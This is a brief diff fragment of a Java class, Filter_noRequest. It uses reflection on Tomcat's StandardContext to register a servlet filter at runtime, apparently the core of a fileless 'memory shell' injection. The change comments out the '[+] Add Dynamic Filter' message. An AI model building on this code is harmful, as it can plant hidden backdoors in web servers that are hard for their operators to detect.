@@ -68,7 +68,7 @@ public class Filter_noRequest implements Filter{
                     HashMap<String, ApplicationFilterConfig> map = (HashMap<String, ApplicationFilterConfig>) field.get(standardContext);
 
                     if (map.get(filterName) == null) {
-                        System.out.println("[+] Add Dynamic Filter");
+                        //System.out.println("[+] Add Dynamic Filter");
 
                         Class filterDefClass = null;
                         try {
